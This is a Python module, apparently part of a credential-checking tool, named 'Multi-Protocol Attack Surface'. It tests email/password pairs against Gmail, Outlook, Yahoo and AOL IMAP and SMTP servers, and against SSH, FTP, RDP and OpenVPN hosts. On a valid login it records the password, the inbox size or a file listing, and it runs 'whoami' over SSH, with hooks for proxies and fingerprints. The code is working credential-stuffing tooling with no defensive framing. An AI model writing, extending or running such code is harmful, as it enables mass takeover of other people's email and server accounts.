"""
Multi-Protocol Attack Surface
Support for IMAP, POP3, SMTP, FTP, SSH, RDP protocols
"""

import asyncio
import logging
from typing import Dict, Any, Optional
import socket

from ..base import BaseChecker, CheckResult, CheckerResult

logger = logging.getLogger(__name__)


class IMAPChecker(BaseChecker):
    """
    IMAP email server checker
    
    Supports:
    - Gmail IMAP
    - Outlook/Office365 IMAP
    - Yahoo IMAP
    - Generic IMAP servers
    """
    
    def __init__(self, config: Dict[str, Any] = None):
        super().__init__("imap", config)
        self.timeout = 15000
        self.imap_servers = {
            'gmail.com': ('imap.gmail.com', 993),
            'outlook.com': ('outlook.office365.com', 993),
            'hotmail.com': ('outlook.office365.com', 993),
            'yahoo.com': ('imap.mail.yahoo.com', 993),
            'aol.com': ('imap.aol.com', 993)
        }
    
    async def check_single(
        self,
        email: str,
        password: str,
        proxy: Optional[Any] = None,
        fingerprint: Optional[Any] = None
    ) -> CheckResult:
        """Check IMAP credentials"""
        
        start_time = asyncio.get_event_loop().time()
        
        try:
            import aioimaplib
            
            # Determine IMAP server
            domain = email.split('@')[1] if '@' in email else ''
            server_info = self.imap_servers.get(domain, ('imap.' + domain, 993))
            
            host, port = server_info
            
            # Connect to IMAP
            imap_client = aioimaplib.IMAP4_SSL(host=host, port=port, timeout=self.timeout / 1000)
            
            try:
                await imap_client.wait_hello_from_server()
                
                # Attempt login
                login_result = await imap_client.login(email, password)
                
                if login_result.result == 'OK':
                    # Get mailbox stats
                    select_result = await imap_client.select('INBOX')
                    
                    message_count = 0
                    if select_result.result == 'OK':
                        # Extract message count
                        for line in select_result.lines:
                            if b'EXISTS' in line:
                                message_count = int(line.split()[0])
                                break
                    
                    await imap_client.logout()
                    
                    response_time = (asyncio.get_event_loop().time() - start_time) * 1000
                    
                    return CheckResult(
                        status=CheckerResult.SUCCESS,
                        email=email,
                        password=password,
                        service=self.service_name,
                        message=f"IMAP valid | Inbox: {message_count} messages",
                        session_data={
                            'server': host,
                            'message_count': message_count
                        },
                        response_time=response_time
                    )
                
                else:
                    await imap_client.logout()
                    return CheckResult(
                        status=CheckerResult.FAILURE,
                        email=email,
                        service=self.service_name,
                        message="Invalid IMAP credentials"
                    )
            
            finally:
                try:
                    await imap_client.close()
                except:
                    pass
        
        except Exception as e:
            logger.error(f"IMAP check error: {e}", exc_info=True)
            return CheckResult(
                status=CheckerResult.ERROR,
                email=email,
                service=self.service_name,
                message=f"IMAP error: {str(e)}"
            )
    
    async def is_account_exists(self, email: str, proxy: Optional[Any] = None) -> bool:
        """IMAP doesn't support account enumeration"""
        return False


class SMTPChecker(BaseChecker):
    """
    SMTP outbound email checker
    
    Tests ability to send email through SMTP
    """
    
    def __init__(self, config: Dict[str, Any] = None):
        super().__init__("smtp", config)
        self.timeout = 15000
        self.smtp_servers = {
            'gmail.com': ('smtp.gmail.com', 587),
            'outlook.com': ('smtp.office365.com', 587),
            'hotmail.com': ('smtp.office365.com', 587),
            'yahoo.com': ('smtp.mail.yahoo.com', 587),
            'aol.com': ('smtp.aol.com', 587)
        }
    
    async def check_single(
        self,
        email: str,
        password: str,
        proxy: Optional[Any] = None,
        fingerprint: Optional[Any] = None
    ) -> CheckResult:
        """Check SMTP credentials"""
        
        start_time = asyncio.get_event_loop().time()
        
        try:
            import aiosmtplib
            
            # Determine SMTP server
            domain = email.split('@')[1] if '@' in email else ''
            server_info = self.smtp_servers.get(domain, ('smtp.' + domain, 587))
            
            host, port = server_info
            
            # Connect to SMTP
            smtp_client = aiosmtplib.SMTP(
                hostname=host,
                port=port,
                timeout=self.timeout / 1000
            )
            
            try:
                await smtp_client.connect()
                await smtp_client.starttls()
                
                # Attempt login
                await smtp_client.login(email, password)
                
                # If we get here, login succeeded
                await smtp_client.quit()
                
                response_time = (asyncio.get_event_loop().time() - start_time) * 1000
                
                return CheckResult(
                    status=CheckerResult.SUCCESS,
                    email=email,
                    password=password,
                    service=self.service_name,
                    message=f"SMTP valid | Server: {host}",
                    session_data={'server': host, 'port': port},
                    response_time=response_time
                )
            
            except aiosmtplib.SMTPAuthenticationError:
                await smtp_client.quit()
                return CheckResult(
                    status=CheckerResult.FAILURE,
                    email=email,
                    service=self.service_name,
                    message="Invalid SMTP credentials"
                )
            
            finally:
                try:
                    await smtp_client.quit()
                except:
                    pass
        
        except Exception as e:
            logger.error(f"SMTP check error: {e}", exc_info=True)
            return CheckResult(
                status=CheckerResult.ERROR,
                email=email,
                service=self.service_name,
                message=f"SMTP error: {str(e)}"
            )
    
    async def is_account_exists(self, email: str, proxy: Optional[Any] = None) -> bool:
        """SMTP doesn't support account enumeration"""
        return False


class SSHChecker(BaseChecker):
    """
    SSH server authentication checker
    
    Tests SSH credentials against servers
    """
    
    def __init__(self, config: Dict[str, Any] = None):
        super().__init__("ssh", config)
        self.timeout = 20000
    
    async def check_single(
        self,
        email: str,  # username for SSH
        password: str,
        proxy: Optional[Any] = None,
        fingerprint: Optional[Any] = None
    ) -> CheckResult:
        """Check SSH credentials"""
        
        start_time = asyncio.get_event_loop().time()
        
        # SSH needs target host in config
        target_host = self.config.get('ssh_host', 'localhost')
        target_port = self.config.get('ssh_port', 22)
        
        try:
            import asyncssh
            
            # Connect to SSH server
            async with asyncssh.connect(
                host=target_host,
                port=target_port,
                username=email,
                password=password,
                known_hosts=None,
                connect_timeout=self.timeout / 1000
            ) as conn:
                
                # Run a test command
                result = await conn.run('whoami', check=True)
                username = result.stdout.strip()
                
                response_time = (asyncio.get_event_loop().time() - start_time) * 1000
                
                return CheckResult(
                    status=CheckerResult.SUCCESS,
                    email=email,
                    password=password,
                    service=self.service_name,
                    message=f"SSH valid | User: {username}",
                    session_data={
                        'host': target_host,
                        'username': username
                    },
                    response_time=response_time
                )
        
        except asyncssh.PermissionDenied:
            return CheckResult(
                status=CheckerResult.FAILURE,
                email=email,
                service=self.service_name,
                message="Invalid SSH credentials"
            )
        
        except Exception as e:
            logger.error(f"SSH check error: {e}", exc_info=True)
            return CheckResult(
                status=CheckerResult.ERROR,
                email=email,
                service=self.service_name,
                message=f"SSH error: {str(e)}"
            )
    
    async def is_account_exists(self, email: str, proxy: Optional[Any] = None) -> bool:
        """SSH enumeration depends on server configuration"""
        return False


class FTPChecker(BaseChecker):
    """
    FTP/FTPS server checker
    
    Tests FTP credentials and lists files
    """
    
    def __init__(self, config: Dict[str, Any] = None):
        super().__init__("ftp", config)
        self.timeout = 15000
    
    async def check_single(
        self,
        email: str,  # username
        password: str,
        proxy: Optional[Any] = None,
        fingerprint: Optional[Any] = None
    ) -> CheckResult:
        """Check FTP credentials"""
        
        start_time = asyncio.get_event_loop().time()
        
        target_host = self.config.get('ftp_host', 'localhost')
        target_port = self.config.get('ftp_port', 21)
        use_tls = self.config.get('ftp_tls', False)
        
        try:
            import aioftp
            
            # Connect to FTP
            client = aioftp.Client()
            
            await client.connect(target_host, target_port)
            
            if use_tls:
                await client.login(email, password, ssl=True)
            else:
                await client.login(email, password)
            
            # List files in home directory
            files = []
            async for path, info in client.list():
                files.append(str(path))
            
            await client.quit()
            
            response_time = (asyncio.get_event_loop().time() - start_time) * 1000
            
            return CheckResult(
                status=CheckerResult.SUCCESS,
                email=email,
                password=password,
                service=self.service_name,
                message=f"FTP valid | Files: {len(files)}",
                session_data={
                    'host': target_host,
                    'file_count': len(files),
                    'files': files[:10]  # First 10 files
                },
                response_time=response_time
            )
        
        except Exception as e:
            error_msg = str(e).lower()
            
            if 'login' in error_msg or 'auth' in error_msg:
                return CheckResult(
                    status=CheckerResult.FAILURE,
                    email=email,
                    service=self.service_name,
                    message="Invalid FTP credentials"
                )
            
            logger.error(f"FTP check error: {e}", exc_info=True)
            return CheckResult(
                status=CheckerResult.ERROR,
                email=email,
                service=self.service_name,
                message=f"FTP error: {str(e)}"
            )
    
    async def is_account_exists(self, email: str, proxy: Optional[Any] = None) -> bool:
        """FTP doesn't support account enumeration"""
        return False


class RDPChecker(BaseChecker):
    """
    RDP (Remote Desktop Protocol) checker
    
    Tests Windows RDP credentials
    """
    
    def __init__(self, config: Dict[str, Any] = None):
        super().__init__("rdp", config)
        self.timeout = 30000
    
    async def check_single(
        self,
        email: str,  # username
        password: str,
        proxy: Optional[Any] = None,
        fingerprint: Optional[Any] = None
    ) -> CheckResult:
        """Check RDP credentials"""
        
        start_time = asyncio.get_event_loop().time()
        
        target_host = self.config.get('rdp_host', 'localhost')
        target_port = self.config.get('rdp_port', 3389)
        
        try:
            # Use xfreerdp for RDP testing
            import subprocess
            
            cmd = [
                'xfreerdp',
                f'/v:{target_host}:{target_port}',
                f'/u:{email}',
                f'/p:{password}',
                '/cert:ignore',
                '+auth-only',
                '/timeout:10000'
            ]
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await asyncio.wait_for(
                process.communicate(),
                timeout=self.timeout / 1000
            )
            
            output = stdout.decode() + stderr.decode()
            
            if 'Authentication success' in output or process.returncode == 0:
                response_time = (asyncio.get_event_loop().time() - start_time) * 1000
                
                return CheckResult(
                    status=CheckerResult.SUCCESS,
                    email=email,
                    password=password,
                    service=self.service_name,
                    message=f"RDP valid | Host: {target_host}",
                    session_data={'host': target_host},
                    response_time=response_time
                )
            
            elif 'Authentication failure' in output:
                return CheckResult(
                    status=CheckerResult.FAILURE,
                    email=email,
                    service=self.service_name,
                    message="Invalid RDP credentials"
                )
            
            else:
                return CheckResult(
                    status=CheckerResult.ERROR,
                    email=email,
                    service=self.service_name,
                    message="RDP connection error"
                )
        
        except FileNotFoundError:
            return CheckResult(
                status=CheckerResult.ERROR,
                email=email,
                service=self.service_name,
                message="xfreerdp not installed (install with: apt install freerdp2-x11)"
            )
        
        except Exception as e:
            logger.error(f"RDP check error: {e}", exc_info=True)
            return CheckResult(
                status=CheckerResult.ERROR,
                email=email,
                service=self.service_name,
                message=f"RDP error: {str(e)}"
            )
    
    async def is_account_exists(self, email: str, proxy: Optional[Any] = None) -> bool:
        """RDP doesn't support account enumeration"""
        return False


class VPNChecker(BaseChecker):
    """
    VPN credentials checker
    
    Supports OpenVPN, WireGuard credential testing
    """
    
    def __init__(self, config: Dict[str, Any] = None):
        super().__init__("vpn", config)
        self.timeout = 30000
    
    async def check_single(
        self,
        email: str,  # username
        password: str,
        proxy: Optional[Any] = None,
        fingerprint: Optional[Any] = None
    ) -> CheckResult:
        """Check VPN credentials"""
        
        vpn_type = self.config.get('vpn_type', 'openvpn')
        
        if vpn_type == 'openvpn':
            return await self._check_openvpn(email, password)
        else:
            return CheckResult(
                status=CheckerResult.ERROR,
                email=email,
                service=self.service_name,
                message=f"VPN type {vpn_type} not supported"
            )
    
    async def _check_openvpn(self, username: str, password: str) -> CheckResult:
        """Check OpenVPN credentials"""
        
        config_file = self.config.get('ovpn_config', '/etc/openvpn/client.ovpn')
        
        try:
            import subprocess
            import tempfile
            
            # Create auth file
            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as auth_file:
                auth_file.write(f"{username}\n{password}\n")
                auth_path = auth_file.name
            
            # Test connection
            cmd = [
                'openvpn',
                '--config', config_file,
                '--auth-user-pass', auth_path,
                '--auth-nocache',
                '--connect-timeout', '10'
            ]
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            try:
                stdout, stderr = await asyncio.wait_for(
                    process.communicate(),
                    timeout=self.timeout / 1000
                )
                
                output = stdout.decode() + stderr.decode()
                
                if 'Initialization Sequence Completed' in output:
                    return CheckResult(
                        status=CheckerResult.SUCCESS,
                        email=username,
                        password=password,
                        service=self.service_name,
                        message="VPN credentials valid"
                    )
                
                elif 'AUTH_FAILED' in output:
                    return CheckResult(
                        status=CheckerResult.FAILURE,
                        email=username,
                        service=self.service_name,
                        message="Invalid VPN credentials"
                    )
                
                else:
                    return CheckResult(
                        status=CheckerResult.ERROR,
                        email=username,
                        service=self.service_name,
                        message="VPN connection error"
                    )
            
            finally:
                # Cleanup
                try:
                    process.kill()
                except:
                    pass
                
                import os
                try:
                    os.unlink(auth_path)
                except:
                    pass
        
        except Exception as e:
            logger.error(f"OpenVPN check error: {e}", exc_info=True)
            return CheckResult(
                status=CheckerResult.ERROR,
                email=username,
                service=self.service_name,
                message=f"VPN error: {str(e)}"
            )
    
    async def is_account_exists(self, email: str, proxy: Optional[Any] = None) -> bool:
        """VPN doesn't support account enumeration"""
        return False
